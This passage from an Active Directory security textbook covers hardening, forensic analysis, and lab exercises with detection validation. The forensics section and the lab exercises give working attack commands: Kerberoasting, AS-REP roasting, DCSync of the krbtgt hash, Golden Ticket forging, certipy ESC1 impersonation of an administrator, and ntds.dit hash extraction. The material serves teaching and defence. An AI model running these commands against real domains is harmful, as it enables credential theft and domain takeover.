| No credential delegation (CredSSP) | Prevents credential forwarding |
| No caching of plaintext credentials | LSASS does not cache cleartext |
| TGT lifetime reduced to 4 hours | Limits ticket reuse window |
| No Kerberos delegation (unconstrained or constrained) | Prevents delegation abuse (§5) |

```powershell
# Add all Domain Admins to Protected Users
Get-ADGroupMember "Domain Admins" | ForEach-Object {
    Add-ADGroupMember -Identity "Protected Users" -Members $_.DistinguishedName
}

# Verify membership
Get-ADGroupMember "Protected Users" | Select-Object Name, SamAccountName, ObjectClass

# CAUTION: Test thoroughly before adding service accounts — many services
# rely on NTLM fallback, delegation, or RC4. Adding them to Protected Users
# will break authentication.
```

### 13.3 Credential Guard and LSA protection

**Credential Guard** (Windows 10 Enterprise / Server 2016+) uses virtualization-based security (VBS) to isolate LSASS secrets in a secure enclave inaccessible to the NT kernel.

```powershell
# Enable via GPO
# Computer Configuration → Administrative Templates → System → Device Guard
#   → Turn On Virtualization Based Security: Enabled
#   → Credential Guard Configuration: Enabled with UEFI lock
#   → Secure Launch Configuration: Enabled

# Verify Credential Guard is running
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object -Property SecurityServicesRunning, VirtualizationBasedSecurityStatus
# SecurityServicesRunning should include "1" (Credential Guard)
```

**LSA protection (RunAsPPL).**

```
# Enable via registry (requires SecureBootEnabled for UEFI-locked enforcement)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# Verify
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
# Expected: 1
```

> **Note.** Credential Guard protects against LSASS memory dumping (Chapter 14B §3) but does not prevent DCSync (§7.1) or ADCS abuse (§9), which operate at the protocol level. Tiered administration and network segmentation are required complementary controls.

### 13.4 ADCS hardening

ADCS misconfiguration is one of the most prevalent AD attack vectors (§9). Hardening requires auditing templates, CA security, and enrollment policies.

**Template auditing:**
```powershell
# List all published certificate templates with dangerous flags
Import-Module ADCSTemplate  # PSGallery: ADCSTemplate module
Get-ADCSTemplate | ForEach-Object {
    $template = $_
    $flags = @()
    if ($template.'msPKI-Certificate-Name-Flag' -band 1) { $flags += 'ENROLLEE_SUPPLIES_SUBJECT' }
    if ($template.'msPKI-Enrollment-Flag' -band 2) { $flags += 'INCLUDE_SYMMETRIC_ALGORITHMS' }
    if ($template.'msPKI-RA-Signature' -eq 0) { $flags += 'NO_ISSUANCE_REQUIREMENTS' }

    $eku = $template.'pKIExtendedKeyUsage'
    if ($eku -contains '2.5.29.37.0') { $flags += 'ANY_PURPOSE_EKU' }
    if ($eku -contains '1.3.6.1.4.1.311.20.2.1') { $flags += 'ENROLLMENT_AGENT_EKU' }
    if ($eku -contains '1.3.6.1.5.5.7.3.2') { $flags += 'CLIENT_AUTH_EKU' }

    if ($flags.Count -gt 0) {
        [PSCustomObject]@{
            TemplateName = $template.Name
            DangerousFlags = $flags -join ', '
            EnrollmentACL = ($template | Get-ADCSTemplateACL |
                Where-Object { $_.Rights -match 'Enroll' } |
                Select-Object -ExpandProperty IdentityReference) -join '; '
        }
    }
} | Format-Table -AutoSize
```

**CA security configuration:**
```powershell
# Require CA certificate manager approval for all templates
# (prevents automatic enrollment of sensitive templates)
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

# Verify the flag is cleared
certutil -getreg policy\EditFlags
# Should NOT include EDITF_ATTRIBUTESUBJECTALTNAME2

# Restrict enrollment agent capabilities
# CA Properties → Enrollment Agents tab → restrict to specific templates and users

# Enable comprehensive auditing on the CA
certutil -setreg CA\AuditFilter 127
# Restart the CA service after changes
Restart-Service CertSvc
```

**Enrollment agent restrictions.** Limit which users can act as enrollment agents and which templates they can enroll on behalf of others:
```
# CA snap-in → Properties → Enrollment Agents → Add restrictions:
# - Specific enrollment agents (not "Everyone")
# - Specific certificate templates (not "All")
# - Specific target users/groups (not "Everyone")
```

### 13.5 Group Policy hardening

**LAPS deployment (Windows LAPS, built-in from Server 2019 / Windows 10 April 2023):**
```powershell
# Extend schema for Windows LAPS (if not already present)
Update-LapsADSchema

# Configure LAPS GPO
# Computer Configuration → Administrative Templates → System → LAPS
#   → Configure password backup directory: Active Directory
#   → Password Settings:
#       - Password complexity: Large letters + small letters + numbers + specials
#       - Password length: 24
#       - Password age: 30 days
#   → Configure authorized password decryptors: Domain Admins

# Verify LAPS is active
Get-LapsADPassword -Identity WORKSTATION01 -AsPlainText
```

**Restricted Admin Mode and Remote Credential Guard:**
```powershell
# Enable Restricted Admin Mode (prevents credential caching on remote host)
# GPO: Computer Configuration → Administrative Templates → System →
#   Credentials Delegation → Restrict delegation of credentials to remote servers
#   → Enabled: Require Restricted Admin

# Enable Remote Credential Guard (SSO without sending credentials to remote host)
# GPO: Computer Configuration → Administrative Templates → System →
#   Credentials Delegation → Remote host allows delegation of non-exportable credentials
#   → Enabled

# Client-side: connect with Remote Credential Guard
mstsc /remoteGuard /v:SERVER01
```

### 13.6 Kerberos hardening

**AES-only enforcement.** Disabling RC4 prevents Kerberoasting with weak encryption and eliminates Overpass-the-Hash using NTLM hashes.

```powershell
# GPO: Computer Configuration → Windows Settings → Security Settings →
#   Local Policies → Security Options →
#   "Network security: Configure encryption types allowed for Kerberos"
#   → Enable only: AES128_HMAC_SHA1 and AES256_HMAC_SHA1
#   → Disable: DES_CBC_CRC, DES_CBC_MD5, RC4_HMAC_MD5

# Verify per-account supported encryption types
Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes |
    Where-Object { $_.'msDS-SupportedEncryptionTypes' -band 0x4 } |  # RC4 bit
    Select-Object SamAccountName, 'msDS-SupportedEncryptionTypes'
# Result should be empty after enforcement

# Set AES-only on specific service accounts
Set-ADUser -Identity svc_sql -Replace @{'msDS-SupportedEncryptionTypes' = 24}
# 24 = AES128 (8) + AES256 (16)
```

> **Warning.** Disabling RC4 domain-wide can break legacy systems that do not support AES (pre-2008 R2 DCs, third-party Kerberos clients). Audit `msDS-SupportedEncryptionTypes` on all accounts and test in a staging environment before enforcement. Event 4769 with `TicketEncryptionType: 0x17` (RC4) in production logs identifies systems still requesting RC4.

**Kerberos FAST armoring (Flexible Authentication Secure Tunneling).**

FAST (RFC 6113) provides an armored TGS exchange that protects against offline password attacks on AS-REQ/AS-REP. It tunnels preauthentication inside an existing TGT, preventing Kerberoasting and AS-REP Roasting at the protocol level.

```powershell
# Require FAST armoring via GPO
# Computer Configuration → Administrative Templates → System → KDC
#   → KDC support for claims, compound authentication and Kerberos armoring
#   → Enabled: Always provide claims, support compound authentication
#       and Kerberos armoring: Supported / Fail unarmored authentication requests

# Client-side GPO
# Computer Configuration → Administrative Templates → System → Kerberos
#   → Kerberos client support for claims, compound authentication and
#     Kerberos armoring → Enabled
```

**Claims-based access control.** Dynamic Access Control (DAC) uses claims from AD attributes to make authorization decisions. Combined with Authentication Policies (§13.1), claims enable fine-grained access control:

```powershell
# Create a claim type based on department attribute
New-ADClaimType -DisplayName "Department" `
    -SourceAttribute "department" `
    -ID "ad://ext/Department" `
    -Enabled $true

# Create a central access rule using the claim
New-ADCentralAccessRule -Name "Finance-Servers-Only" `
    -ResourceCondition '(@RESOURCE.Department == "Finance")' `
    -CurrentAcl 'O:SYG:SYD:(A;;FA;;;DA)(A;;FA;;;BA)(XA;;FA;;;AU;(@USER.Department == "Finance"))'
```

---

## 14. AD Forensics and Evidence Collection

This section covers post-incident forensic analysis of Active Directory. It complements Chapter 14B §6 (Windows forensics and IR, which covers process-level and OS-level forensics). The focus here is directory-level artifacts: the AD database, replication metadata, Group Policy history, and deleted object recovery.

### 14.1 ntds.dit offline analysis

The `ntds.dit` file is the AD database (ESE/JET Blue format) containing all domain objects, attributes, password hashes, and Kerberos keys. Offline analysis of a captured `ntds.dit` (from §8) reveals the full credential state of the domain at the time of capture.

**Impacket secretsdump (preferred for hash extraction):**
```bash
# Extract all hashes from ntds.dit + SYSTEM hive
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL \
    -outputfile domain_hashes

# Output files:
# domain_hashes.ntds          — NTLM hashes (user:rid:lmhash:nthash)
# domain_hashes.ntds.kerberos — Kerberos keys (AES256, AES128, DES, RC4)
# domain_hashes.ntds.cleartext — Cleartext passwords (if reversible encryption enabled)

# Extract specific user
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL \
    -just-dc-user "domain\krbtgt" -outputfile krbtgt_keys

# Extract machine account keys (for Silver Ticket analysis)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL \
    -just-dc-user "DC01$" -outputfile dc01_keys
```

**DSInternals (PowerShell module — detailed attribute analysis):**
```powershell
# Install DSInternals
Install-Module -Name DSInternals -Force

# Mount the ntds.dit database
$bootKey = Get-BootKey -SystemHivePath .\SYSTEM
$db = Get-ADDBAccount -All -DBPath .\ntds.dit -BootKey $bootKey

# Export all accounts with password hashes
$db | Format-Custom -View HashcatNT | Out-File domain_hashes_nt.txt

# Analyze password quality
$db | Test-PasswordQuality `
    -WeakPasswordHashesFile .\known_weak_hashes.txt `
    -WeakPasswords @('Password1', 'Summer2025', 'Company123')

# Find accounts with Kerberos keys
$db | Where-Object { $_.KerberosKeys -ne $null } |
    Select-Object SamAccountName, @{N='AES256';E={$_.KerberosKeys | Where-Object KeyType -eq 'AES256-CTS-HMAC-SHA1-96'}} |
    Format-Table

# Find accounts with SID history set
$db | Where-Object { $_.SidHistory.Count -gt 0 } |
    Select-Object SamAccountName, SidHistory

# Find accounts with reversible encryption (cleartext passwords)
$db | Where-Object { $_.SupplementalCredentials.ClearText -ne $null } |
    Select-Object SamAccountName, @{N='ClearText';E={$_.SupplementalCredentials.ClearText}}

# Check krbtgt key version (indicates Golden Ticket usage if recently changed)
$db | Where-Object { $_.SamAccountName -eq 'krbtgt' } |
    Select-Object SamAccountName, @{N='KeyVersion';E={$_.KerberosKeys[0].IterationCount}},
        @{N='PwdLastSet';E={$_.PasswordLastSet}}
```

### 14.2 AD replication metadata forensics

Every attribute modification in AD carries replication metadata (`msDS-ReplValueMetaData` for linked values, `replPropertyMetaData` for non-linked values). This metadata records the originating DC, USN, timestamp, and version number for every change — even if the attribute value itself has been reverted. This is critical for forensics because an attacker who modifies an attribute and then restores the original value still leaves a metadata trail.

**Querying replication metadata:**
```powershell
# Get replication metadata for a specific object (e.g., AdminSDHolder)
Get-ADObject "CN=AdminSDHolder,CN=System,DC=domain,DC=local" `
    -Properties replPropertyMetaData |
    Select-Object -ExpandProperty replPropertyMetaData |
    ForEach-Object {
        $entry = [System.DirectoryServices.ActiveDirectory.ReplicationMetadata]$_
        [PSCustomObject]@{
            AttributeName    = $entry.AttributeName
            LastOriginatingChangeTime = $entry.LastOriginatingChangeTime
            OriginatingServer = $entry.LastOriginatingInvocationId
            Version          = $entry.Version
            LocalChangeUsn   = $entry.LocalChangeUsn
        }
    } | Sort-Object LastOriginatingChangeTime -Descending | Format-Table

# Using repadmin for quick metadata check
repadmin /showobjmeta DC01 "CN=AdminSDHolder,CN=System,DC=domain,DC=local"

# Check msDS-KeyCredentialLink metadata (Shadow Credentials forensics, §6)
Get-ADUser targetuser -Properties msDS-ReplValueMetaData |
    Select-Object -ExpandProperty 'msDS-ReplValueMetaData' |
    ForEach-Object {
        ([xml]$_).DS_REPL_VALUE_META_DATA |
        Select-Object ftimeCreated, ftimeDeleted, pszLastOriginatingDsaDN,
            dwVersion, usnOriginatingChange
    }
```

**Key forensic indicators in replication metadata:**

| Indicator | What it reveals | Investigation action |
|-----------|----------------|---------------------|
| `nTSecurityDescriptor` version spike on domain root | ACL modification for persistence (§4.3) | Compare current DACL to known-good baseline |
| `msDS-KeyCredentialLink` with recent `ftimeCreated` | Shadow Credential added (§6) | Identify originating DC and correlate with logon events |
| `sIDHistory` added with `ftimeCreated` in incident window | SID history injection (§2.1) | Check if the added SID is a privileged group |
| `member` attribute changes on privileged groups | Group membership manipulation | Correlate with 4728/4732/4756 events |
| `servicePrincipalName` changes on user accounts | SPN added for targeted Kerberoasting (§1.2) | Check if the SPN maps to a real service |
| `userAccountControl` version > 1 with recent change | UAC flag manipulation (AS-REP setup, §1.1) | Compare with expected UAC value |

### 14.3 Group Policy forensic timeline

Group Policy Objects are stored in SYSVOL (`\\domain\SYSVOL\domain\Policies\`) and replicated via DFS-R (or FRS in legacy environments). Each GPO has a version number incremented on modification. The SYSVOL version history combined with the GPO's `whenChanged` attribute provides a forensic timeline.

**Building a GPO timeline:**
```powershell
# Enumerate all GPOs with modification timestamps
Get-GPO -All | Select-Object DisplayName, Id,
    @{N='UserVersion';E={$_.User.DSVersion}},
    @{N='ComputerVersion';E={$_.Computer.DSVersion}},
    ModificationTime, CreationTime |
    Sort-Object ModificationTime -Descending |
    Format-Table -AutoSize

# Check for recently modified GPOs (last 7 days)
$threshold = (Get-Date).AddDays(-7)
Get-GPO -All | Where-Object { $_.ModificationTime -gt $threshold } |
    ForEach-Object {
        $gpo = $_
        $report = Get-GPOReport -Guid $gpo.Id -ReportType Xml
        [PSCustomObject]@{
            GPOName       = $gpo.DisplayName
            GPOId         = $gpo.Id
            Modified      = $gpo.ModificationTime
            LinksTo       = ($report | Select-Xml "//LinksTo/SOMPath" |
                            ForEach-Object { $_.Node.InnerText }) -join '; '
        }
    } | Format-Table -AutoSize

# SYSVOL file-level forensics (check for persistence scripts in GPO)
Get-ChildItem "\\domain.local\SYSVOL\domain.local\Policies\" -Recurse -File |
    Where-Object { $_.LastWriteTime -gt $threshold } |
    Select-Object FullName, LastWriteTime, Length |
    Sort-Object LastWriteTime -Descending
```

**GPO-based persistence indicators:**

| Artifact | Location in SYSVOL | Attack technique |
|----------|-------------------|-----------------|
| Scheduled task XML | `Machine\Preferences\ScheduledTasks\` | Persistence via GPO-deployed scheduled task |
| Startup/logon scripts | `Machine\Scripts\Startup\`, `User\Scripts\Logon\` | Script-based persistence or credential harvesting |
| Registry.pol modifications | `Machine\Registry.pol`, `User\Registry.pol` | Registry-based persistence (Run keys, services) |
| Software installation (.msi) | `Machine\Applications\` | Malicious software deployment via GPO |
| Security template (.inf) | `Machine\Microsoft\Windows NT\SecEdit\` | Weakening security settings (audit policy, password policy) |

### 14.4 Tombstone and deleted objects recovery

When AD objects are deleted, they are moved to the `CN=Deleted Objects` container and retained for the tombstone lifetime (default: 180 days for AD 2003+, configurable). During this period, most attributes are stripped, but some are preserved and forensically relevant.

**Querying deleted objects:**
```powershell
# List all deleted objects (requires AD Recycle Bin enabled for full attribute retention)
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties * |
    Select-Object Name, DistinguishedName, ObjectClass, whenChanged, whenCreated,
        isDeleted, lastKnownParent, msDS-LastKnownRDN |
    Sort-Object whenChanged -Descending |
    Format-Table -AutoSize

# Search for deleted user accounts in a specific timeframe
$startDate = [DateTime]"2026-05-01"
$endDate = [DateTime]"2026-05-13"
Get-ADObject -Filter 'isDeleted -eq $true -and ObjectClass -eq "user"' `
    -IncludeDeletedObjects -Properties whenChanged, lastKnownParent, sAMAccountName |
    Where-Object { $_.whenChanged -ge $startDate -and $_.whenChanged -le $endDate } |
    Select-Object sAMAccountName, lastKnownParent, whenChanged

# Recover a deleted object (requires AD Recycle Bin)
Restore-ADObject -Identity "CN=targetuser\0ADEL:a1b2c3d4-...,CN=Deleted Objects,DC=domain,DC=local"
```

> **AD Recycle Bin.** If the AD Recycle Bin is enabled (`Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target domain.local`), deleted objects retain all attributes for the deleted object lifetime (default: 180 days). Without it, most attributes are stripped at deletion, significantly limiting forensic value. Verify: `Get-ADOptionalFeature -Filter 'Name -eq "Recycle Bin Feature"'`.

**Forensic value of deleted objects:**

| Scenario | What to look for | Significance |
|----------|-----------------|-------------|
| Attacker creates and deletes machine account | Deleted computer object with recent `whenCreated` | RBCD attack cleanup (§5.2) |
| Attacker creates and deletes user account | Deleted user with group membership artifacts | Temporary privilege escalation |
| Group membership removal | `member` attribute replication metadata | Cover-up of group-based persistence |
| GPO deleted after use | Deleted GPO in tombstone | GPO-based persistence cleanup |

### 14.5 Azure AD Connect sync forensics (hybrid environments)

In hybrid AD deployments, Azure AD Connect synchronizes on-premises AD objects to Azure AD/Entra ID. Forensic analysis must cover both directions.

**Key artifacts on the Azure AD Connect server:**

| Artifact | Path | Contains |
|----------|------|----------|
| Sync engine database | `%ProgramData%\AADConnect\ADSync.mdf` | Full sync state, connector space, metaverse |
| Sync rules | PowerShell: `Get-ADSyncRule` | Custom sync rules (may indicate persistence) |
| MSOL account credentials | LSA secrets | Credentials for the service account that has DCSync-equivalent rights |
| Connector configuration | `Get-ADSyncConnector` | On-prem and Azure AD connection parameters |

**Forensic analysis:**
```powershell
# Check the MSOL service account (has replication rights — high-value target)
Get-ADSyncConnector | Where-Object { $_.ConnectorTypeName -eq 'AD' } |
    Select-Object Name, @{N='ServiceAccount';E={
        $_.ConnectivityParameters | Where-Object { $_.Name -eq 'forest-login-user' } |
        Select-Object -ExpandProperty Value
    }}

# Check for custom sync rules (attacker may add rules to sync malicious attributes)
Get-ADSyncRule | Where-Object { $_.ImmutableTag -eq $null } |
    Select-Object Name, Direction, Precedence, ConnectorName,
        @{N='Transformations';E={$_.AttributeFlowMappings.Count}}

# Check sync history for anomalies
Get-ADSyncRunProfileResult -ConnectorName "domain.local" -NumberRequested 50 |
    Select-Object StartDate, EndDate, Result,
        @{N='Adds';E={$_.StepResults.Adds}},
        @{N='Updates';E={$_.StepResults.Updates}},
        @{N='Deletes';E={$_.StepResults.Deletes}} |
    Sort-Object StartDate -Descending | Format-Table

# CRITICAL: The MSOL account password is stored in LSA secrets and can be
# extracted with Mimikatz (sekurlsa::dpapi) or impacket-secretsdump.
# If the AADConnect server is compromised, assume the MSOL account is
# compromised → DCSync capability → full domain compromise.
```

**Azure AD Connect compromise indicators:**

| Indicator | Detection method | Impact |
|-----------|-----------------|--------|
| MSOL account used from non-AADConnect IP | 4624 + 4662 correlation with source IP | DCSync via MSOL account (CVE-2021-42306 context) |
| Custom sync rules added | `Get-ADSyncRule` audit | Attribute manipulation, password writeback abuse |
| Abnormal sync volume | Sync run profile results | Mass credential exfiltration |
| AADConnect server in unexpected network segment | Asset inventory validation | Rogue AADConnect for credential harvesting |
| Password writeback enabled unexpectedly | `Get-ADSyncAADPasswordResetConfiguration` | Cloud-to-on-prem password reset abuse |

---

## 15. Cross-references

**To Domain 13 Chapter 13B:** Kerberos ticket forging (Golden/Silver/Diamond Ticket) and NTLM relay mechanics are defined there. This chapter extends with delegation abuse, ADCS exploitation, and coercion protocols. The cryptographic foundations of Kerberos etype cracking (§1.1, §1.2) are in Chapter 13A §1–2.

**To Chapter 14B:** Windows token internals, LSASS protection (Credential Guard, RunAsPPL), and Exchange-specific attacks. LSASS credential extraction is the prerequisite for many attacks here (obtaining NTLM hashes for PtH, Kerberos keys for Overpass-the-Hash).

**To Domain 10:** Azure AD Connect sync creates a cloud attack path from on-premises AD compromise. The `AZUREADSSOACC$` account's Kerberos key (obtainable via DCSync) enables forging Azure AD seamless SSO tickets. Cloud-only accounts are not directly affected by on-premises AD attacks, but hybrid identities are.

**To Domain 11:** DCSync and credential dumping are operational tradecraft for post-compromise. Process injection and C2 channels (Chapter 11A) are the delivery mechanisms for running Mimikatz, Rubeus, Certify, and other AD attack tools in memory.

**To Domain 27:** Detection engineering for AD attacks (Sigma rules, SIEM correlation) is operationalized in Chapter 27C. The consolidated Sigma rules in §11.1 provide AD-specific detection; Chapter 27C provides the SIEM operationalization framework. Zero Trust architectures (Chapter 27B) reduce the impact of AD compromise by eliminating implicit trust based on network location or domain membership. The tiered administration model (§13.1) is the AD-specific implementation of Zero Trust principles.

**To Domain 30:** C2 framework internals (Chapter 30A) cover the operator's perspective of executing AD attacks through implants. Credential theft techniques (Chapter 30B) are the prerequisite for many attacks in this chapter — LSASS dumping, SAM extraction, and cached credential harvesting feed into PtH, Kerberoasting, and delegation abuse. The YARA rules in §11.2 detect AD attack tools (SharpHound, Rubeus, Certify) that are typically delivered via C2 frameworks documented in Chapter 30A.

**Internal cross-references (§11–§14).** The detection engineering section (§11) references inline Sigma rules from §1–§10 and provides complementary multi-event correlation. Attack path analysis (§12) operationalizes the ACL abuse chains from §4–§5. The hardening reference (§13) provides countermeasures for every attack in §1–§10. The forensics section (§14) extends §7 (DCSync/DCShadow) and §8 (NTDS.DIT extraction) with post-incident analysis methodology.

---

## 16. Exercises

### Exercise 14A-1 — Kerberoasting campaign with detection validation

**Objective.** Perform an end-to-end Kerberoasting engagement on a lab domain: enumerate roastable SPNs, request RC4 and AES tickets, crack offline, and validate that the Sigma rules in §1.2 and §11.1 (Rule 1) fire correctly in the SIEM.

**Steps.**

1. Deploy a lab AD environment with at least three user-account SPNs (one with a weak password, one with AES-only, one with RC4 fallback). Configure `Audit Kerberos Service Ticket Operations` on the DC.
2. From a domain-joined Windows host, run `Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat`. Record the etype requested for each ticket.
3. From a Linux host, run `impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC> -request -outputfile hashes_impacket.txt`. Compare ticket etypes.
4. Attempt targeted Kerberoasting: use `Set-DomainObject` (PowerView) to set an SPN on a user without one, roast, then remove the SPN. Verify Event ID 4738 fires for the SPN attribute change.
5. Crack with `hashcat -m 13100` (RC4) and `-m 19700` (AES). Document cracking time difference.
6. In the SIEM, confirm that the Sigma rules from §1.2 and §11.1 Rule 1 generated alerts. Tune false-positive filters for your environment.

**Deliverable.** Lab report including: enumeration output, cracked credentials, SIEM alert screenshots, and a comparison table of RC4 vs AES cracking throughput.

### Exercise 14A-2 — AS-REP Roasting with weaponized variant

**Objective.** Execute both standard and weaponized AS-REP Roasting, validate detection of the `DONT_REQ_PREAUTH` toggle, and measure the detection window.

**Steps.**

1. In the lab domain, create a user with `DONT_REQ_PREAUTH` enabled. Create a second user without it but where the attacker has `GenericWrite`.
2. Roast the first user with `impacket-GetNPUsers`. Crack the hash with `hashcat -m 18200`.
3. For the weaponized variant: use PowerView to enable `DONT_REQ_PREAUTH` on the second user, roast with Rubeus, then disable the flag. Time the window (flag set → flag removed).
4. Query Event IDs 4738 and 4768 (PreAuthType: 0) on the DC. Confirm the correlation rule from §11.1 Rule 2 fires.
5. Implement the hardening from §1.1: remove the flag, enforce AES, add to monitoring.

**Deliverable.** Timeline documenting flag-toggle window in seconds, detection latency from SIEM, and a remediation checklist.

### Exercise 14A-3 — DCSync execution and forensic analysis

**Objective.** Perform DCSync from a non-DC host, extract the `krbtgt` hash, craft a Golden Ticket, and conduct forensic analysis of the replication traffic.

**Steps.**

1. From a host with DA credentials (lab), run `impacket-secretsdump domain.local/admin:pass@DC01 -just-dc-user krbtgt`. Capture the `krbtgt` NTLM hash.
2. Verify Event ID 4662 on the DC shows replication GUIDs (`1131f6aa-...`, `1131f6ad-...`) from a non-DC `SubjectUserName`.
3. Using the `krbtgt` hash, forge a Golden Ticket: `impacket-ticketer -nthash <hash> -domain-sid <SID> -domain domain.local Administrator`. Use the ticket with `impacket-psexec`.
4. Capture network traffic during DCSync. Identify the `DRSGetNCChanges` RPC calls in Wireshark (filter: `dcerpc.cn_call_id`).
5. Apply the enhanced Sigma rule from §11.1 Rule 3. Verify it would have detected the attack. Document the source-IP validation step.

**Deliverable.** PCAP excerpt showing DRSUAPI traffic, SIEM correlation output, Golden Ticket proof-of-concept, and a network segmentation recommendation to block non-DC DRSUAPI.

### Exercise 14A-4 — ADCS ESC1 exploitation with Certipy

**Objective.** Identify and exploit an ESC1-vulnerable certificate template, escalate to Domain Admin via PKINIT, and harden the template.

**Steps.**

1. Deploy ADCS in the lab with a vulnerable template: enable `ENROLLEE_SUPPLIES_SUBJECT`, add Client Authentication EKU, grant enrollment to Domain Users, disable Manager Approval.
2. Run `certipy find -u user@domain.local -p pass -dc-ip <DC> -vulnerable`. Confirm the template is flagged as ESC1.
3. Exploit: `certipy req -u user@domain.local -p pass -ca YOURCA -template VulnTemplate -upn administrator@domain.local -dc-ip <DC>`.
4. Authenticate: `certipy auth -pfx administrator.pfx -dc-ip <DC>`. Obtain the administrator NTLM hash.
5. Verify Event ID 4887 on the CA and Event ID 4768 (PKINIT PreAuthType 16/17) on the DC.
6. Remediate: remove `ENROLLEE_SUPPLIES_SUBJECT`, require Manager Approval, set `StrongCertificateBindingEnforcement = 2`. Re-run `certipy find` to confirm the template is no longer vulnerable.

**Deliverable.** Certipy enumeration output (before/after hardening), certificate PFX, authentication proof, and a hardening diff showing the template changes.

### Exercise 14A-5 — BloodHound CE attack-path analysis and remediation

**Objective.** Ingest a full AD dataset into BloodHound CE, identify the shortest path from a compromised low-privilege user to Domain Admin, execute the chain, and remediate each link.

**Steps.**

1. Run SharpHound with `--CollectionMethods All` to collect the full AD dataset. Import into BloodHound CE.
2. Mark one low-privilege user as "owned." Query the shortest path to Domain Admins: `MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p`.
3. Document each edge in the path (e.g., `GenericWrite` → targeted Kerberoast → `AddMember`). Execute the attack chain step-by-step in the lab.
4. For each edge, implement the remediation: remove the ACE, restrict the delegation, rotate the password. Re-run SharpHound and verify the path is eliminated.
5. Query for remaining Tier-0 attack paths. Document the residual risk.

**Deliverable.** BloodHound graph screenshot (before/after), step-by-step attack-chain log, remediation actions per edge, and a residual-risk assessment.

---

## 17. Readings and References

> All URLs verified and retrieved: 2026-05-29.

### Standards and specifications

- Microsoft, "How Kerberos Authentication Works," Microsoft Learn (2025): https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview
- Microsoft, "Kerberos Constrained Delegation Overview," Microsoft Learn (2025): https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview
- Microsoft, "AD CS Certificate Template Security," Microsoft Learn (2025): https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts

### Vulnerability advisories

- CVE-2026-20833 — Kerberos KDC RC4 encryption default change. Microsoft Support (April 2026): https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc
- CVE-2025-60704 — Kerberos delegation elevation of privilege (S4U2Self/S4U2Proxy validation flaws). Silverfort (November 2025): https://www.silverfort.com/blog/you-win-some-you-checksum-kerberos-delegation-vulnerability-cve-2025-60704/
- CVE-2021-42278 / CVE-2021-42287 — sAMAccountName spoofing (noPac). MITRE ATT&CK T1558.

### Research papers and technical references

- SpecterOps, "Certified Pre-Owned: Abusing Active Directory Certificate Services" (2021): https://posts.specterops.io/certified-pre-owned-d95910965cd2
- SpecterOps, "BloodHound CE Documentation" (2025): https://bloodhound.readthedocs.io/
- Harmj0y, "Rubeus — Kerberos Interaction and Abuses" (2022): https://github.com/GhostPack/Rubeus
- Fortra/Impacket, "Impacket — Network Protocols" (2025): https://github.com/fortra/impacket
- SigmaHQ, "Sigma Detection Rules" (2026): https://github.com/SigmaHQ/sigma

### MITRE ATT&CK references

- T1558.003 — Kerberoasting: https://attack.mitre.org/techniques/T1558/003/
- T1558.004 — AS-REP Roasting: https://attack.mitre.org/techniques/T1558/004/
- T1003.006 — DCSync: https://attack.mitre.org/techniques/T1003/006/
- T1207 — DCShadow: https://attack.mitre.org/techniques/T1207/
- T1649 — Steal or Forge Authentication Certificates: https://attack.mitre.org/techniques/T1649/
- T1134.001 — Token Impersonation/Theft: https://attack.mitre.org/techniques/T1134/001/
- T1187 — Forced Authentication: https://attack.mitre.org/techniques/T1187/

---

## 18. Cross-References (table)

| Section | Related Chapter | Topic | Relationship |
|---------|----------------|-------|-------------|
| §1 Kerberos attacks | Domain 13 Ch. 13B §4–5 | Kerberos architecture, ticket forging | Prerequisite — etype mechanics and ticket lifecycle |
| §4 ACL abuse | Domain 11 Ch. 11A §1–3 | Process injection, in-memory tooling | Delivery mechanism for BloodHound, Rubeus, PowerView |
| §7 DCSync/DCShadow | Chapter 14B §3 | LSASS protection, Credential Guard | Credential extraction feeds DCSync; Credential Guard constrains it |
| §9 ADCS | Domain 10 Ch. 10A | Azure AD / Entra ID PKI integration | ADCS certs authenticate to Entra ID via hybrid trust |
| §10 Coercion | Chapter 14B §5.1 | Exchange on-premises | Exchange as coercion relay target (ESC8 + PetitPotam) |
| §11 Detection | Domain 27 Ch. 27C | SIEM operationalization | Sigma rules here are operationalized in the 27C SIEM framework |

---

## 19. Glossary

| Term | Definition |
|------|-----------|
| **AS-REP Roasting** | Offline password attack targeting accounts with Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`); the attacker requests an AS-REP and cracks the encrypted portion. |
| **Kerberoasting** | Offline password attack against service accounts by requesting TGS tickets for their SPNs and cracking the encrypted ticket offline. |
| **DCSync** | Technique using the Directory Replication Service (DRSUAPI) to replicate password hashes from a Domain Controller without direct DC access. |
| **DCShadow** | Technique that temporarily registers a rogue Domain Controller to push malicious replication data to legitimate DCs, evading standard audit logging. |
| **ADCS (Active Directory Certificate Services)** | Microsoft's PKI implementation; misconfigurations in certificate templates (ESC1–ESC13) enable privilege escalation via certificate enrollment abuse. |
| **BloodHound CE** | Community Edition of the attack-path analysis tool that ingests AD/Azure data and visualizes ACL-based privilege escalation paths as a directed graph. |
| **SPN (Service Principal Name)** | A unique identifier for a service instance in Kerberos; user-account SPNs are the target of Kerberoasting because their passwords may be weak. |
